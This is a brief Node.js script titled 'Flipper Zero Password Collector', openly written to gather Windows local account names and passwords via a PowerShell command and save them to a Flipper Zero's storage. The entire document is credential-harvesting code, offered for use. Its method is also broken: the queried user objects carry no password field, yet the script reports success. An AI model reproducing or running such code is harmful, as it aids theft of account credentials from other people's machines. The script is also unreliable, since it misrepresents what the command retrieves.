# Flipper Zero Password Collector

const fs = require('fs');
const { exec } = require('child_process');

function collectPasswords() {
    exec('powershell Get-LocalUser | Select-Object -Property Name, Password', (error, stdout, stderr) => {
        if (error) {
            console.error(`Error executing command: ${error.message}`);
            return;
        }
        if (stderr) {
            console.error(`Error: ${stderr}`);
            return;
        }
        saveToFlipper(stdout);
    });
}

function saveToFlipper(data) {
    const flipperPath = '/path/to/flipper/zero/storage/passwords.txt';
    fs.writeFile(flipperPath, data, (err) => {
        if (err) {
            console.error(`Error writing to Flipper Zero: ${err.message}`);
            return;
        }
        console.log('Passwords saved to Flipper Zero successfully.');
    });
}

collectPasswords();
